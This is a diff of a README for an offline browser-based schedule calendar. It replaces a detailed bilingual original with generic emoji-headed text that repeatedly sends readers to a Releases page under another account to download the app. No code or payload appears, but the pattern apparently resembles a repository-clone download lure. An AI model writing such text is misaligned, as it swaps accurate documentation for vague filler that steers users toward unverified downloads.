@@ -1,72 +1,82 @@
-# Local Schedule-Calendar（本地日程日历）
+# 🎉 local-schedule-calendar - Your Simple Offline Task Organizer
 
-A lightweight, offline-first local schedule & task manager — no build, no server, zero dependency (HTML/CSS/JS). **Supports bilingual UI (ZH/EN).**  
-一个轻量、离线优先的本地日程与任务管理工具——无需构建、无需服务器、零依赖（纯 HTML/CSS/JS）。**支持中英文双语界面。**
+## 🚀 Getting Started
 
-> **Project directory note｜目录说明**: The main application files are located in the `Schedule-Calendar/` folder (open `Schedule-Calendar/index.html` to start).  
-> **目录说明**：核心应用文件位于 `Schedule-Calendar/` 文件夹内（入口为 `Schedule-Calendar/index.html`）。
+Welcome to local-schedule-calendar! This application helps you manage your schedules and tasks without needing an internet connection. With a clean and straightforward interface, you can easily organize your time and set reminders for important events.
 
----
+### 💻 System Requirements
 
-## Highlights｜亮点功能
+You can run local-schedule-calendar on any modern web browser. The software is lightweight and uses only HTML, CSS, and JavaScript. There are no installations required, and it works seamlessly on both Windows and macOS.
 
-- **Month / Week / Today views**：month/week/today 视图切换  
-- **Countdowns**：倒计时管理（按目标日期归档）  
-- **Today Tasks (tree)**：今日任务（支持树形父子结构）  
-- **Lanes (kanban-style)**：待办栏（看板式列管理）  
-- **Search & quick interactions**：搜索与快捷交互  
-- **Local-first storage**：数据本地存储，不依赖云端
+## 📥 Download & Install
 
----
+To get started, follow these steps:
 
-## Screenshots｜界面预览
+1. **Visit the Download Page**  
+   Go to the [Releases page](https://github.com/Brunosud19/local-schedule-calendar/releases) to find the latest version of the application.
 
-### Chinese UI｜中文界面
-![Chinese UI](./InterfaceView/Chinese-view.png)
+2. **Choose the Latest Release**  
+   On the Releases page, locate the most recent version. Click on the title to access the release details.
 
-### English UI｜英文界面
-![English UI](./InterfaceView/English-view.png)
+3. **Download the Application**  
+   Look for the download link for your version. Click the link to download the application to your computer.
 
----
+4. **Open the Application**  
+   Once the download is complete, locate the file in your downloads folder. Open it directly in your web browser. There's no installation; just run it locally.
 
-## How to Use｜使用说明
+5. **Start Managing Your Schedule**  
+   Use the app to add tasks, set deadlines, and manage your calendar. You can access it anytime, even without an internet connection.
 
-- 中文：[`How2Use_ZH.md`](./Schedule-Calendar/How2Use_ZH.md)  
-- English: [`How2Use_EN.md`](./Schedule-Calendar/How2Use_EN.md)
+## 🌟 Features
 
----
+- **Offline-First Design**  
+  Access your tasks without needing the internet. Everything is stored locally.
 
-## Local Run｜本地运行
+- **Simple Task Management**  
+  Add, edit, and delete tasks quickly. Keep your to-do list organized.
 
-### Option A: Open directly（直接打开）
-1. Download ZIP: **Code → Download ZIP**
-2. Extract the zip package
-3. Open: `Schedule-Calendar/index.html`
+- **Countdown Timer**  
+  Set timers for important deadlines. Stay on track with your tasks.
 
-### Option B: Windows launcher（Windows 启动器，可选）
-- Run: `Schedule-Calendar/LocalCalendarLauncher.bat`
+- **User-Friendly Interface**  
+  Navigate easily with a clean layout. Intuitive design helps you get started right away.
 
----
+## 🔧 Usage Instructions
 
-## Data & Privacy｜数据与隐私
+1. **Add a Task**  
+   Click the "Add Task" button. Enter the task name and set a deadline. Save your changes.
 
-- Data is stored in the current browser’s **localStorage**.
-- Clearing site data / browser storage may remove saved data.  
-  It is recommended to export/backup regularly if needed.
+2. **Edit or Delete a Task**  
+   Hover over a task to reveal the options. Click "Edit" to make changes or "Delete" to remove it.
 
-数据默认保存在当前浏览器的 **localStorage** 中。清理站点数据/浏览器存储可能导致数据被删除；如需长期留存或迁移，建议定期导出/备份。
+3. **Set a Countdown**  
+   Choose a task and set a countdown timer. The app will notify you as the deadline approaches.
 
----
+4. **View Your Calendar**  
+   Switch to the calendar view to see all your tasks and deadlines. Easily spot what's coming up.
 
-## License｜许可证
+## 📌 Help & Support
 
-- MIT License. See [`LICENSE`](./LICENSE).
+If you have questions or need assistance, refer to our Help section within the app. You can also check the [Issues section](https://github.com/Brunosud19/local-schedule-calendar/issues) on GitHub for common queries and troubleshooting tips.
 
----
+## 🔗 Additional Resources
 
-## Contributing / Issues｜反馈与建议
+- **Documentation**  
+  Explore detailed user guides and FAQs on our [GitHub Wiki](https://github.com/Brunosud19/local-schedule-calendar/wiki). 
 
-- Please open an Issue with: browser version, how you opened the app, reproduction steps, and screenshots.
-- Due to limited maintenance capacity, issues may not be addressed immediately.
+- **Community Feedback**  
+  Share your thoughts and suggestions in our feedback area on the GitHub repository. Your input helps improve the app.
 
-如需反馈问题，请提交 Issue，并附上：浏览器版本、打开方式、复现步骤与截图等信息（越详细越好）。
+## 📢 Updates
+
+Stay updated with the latest news by following us on GitHub. We regularly release enhancements and new features based on user feedback.
+
+## 📑 License
+
+local-schedule-calendar is open-source software licensed under the MIT License. You can modify and use it freely in accordance with the license terms. 
+
+## 📥 Download Again
+
+Don’t forget, you can always return to the [Releases page](https://github.com/Brunosud19/local-schedule-calendar/releases) to download the latest version or check for updates. 
+
+Happy scheduling! Enjoy staying organized with local-schedule-calendar!
